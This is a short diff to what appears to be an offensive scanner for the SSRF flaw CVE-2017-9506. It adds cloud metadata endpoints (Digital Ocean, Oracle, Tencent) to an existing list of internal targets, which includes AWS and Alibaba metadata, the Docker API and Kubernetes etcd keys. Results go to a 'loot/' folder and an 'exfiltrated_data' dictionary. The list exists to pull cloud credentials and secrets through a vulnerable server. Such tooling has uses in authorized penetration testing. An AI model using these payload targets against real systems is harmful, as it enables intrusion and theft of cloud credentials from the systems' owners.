@@ -34,7 +34,10 @@ def check_cve_2017_9506(base_url, output_folder="loot/"):
                 "AWS Metadata": "http://169.254.169.254/latest/meta-data/",
                 "Alibaba Metadata": "http://100.100.100.200/latest/meta-data/",
                 "Docker Containers": "http://127.0.0.1:2375/v1.24/containers/json",
-                "Kubernetes ETCD API keys": "http://127.0.0.1:2379/v2/keys/?recursive=true"
+                "Kubernetes ETCD API keys": "http://127.0.0.1:2379/v2/keys/?recursive=true",
+                "Digital Ocean Metadata":"http://169.254.169.254/metadata/v1.json",
+                "Oracle Cloud":"http://192.0.0.192/latest/user-data/",
+                "Tencent Cloud":"http://metadata.tencentyun.com/latest/meta-data/",
             }
 
             exfiltrated_data = {}
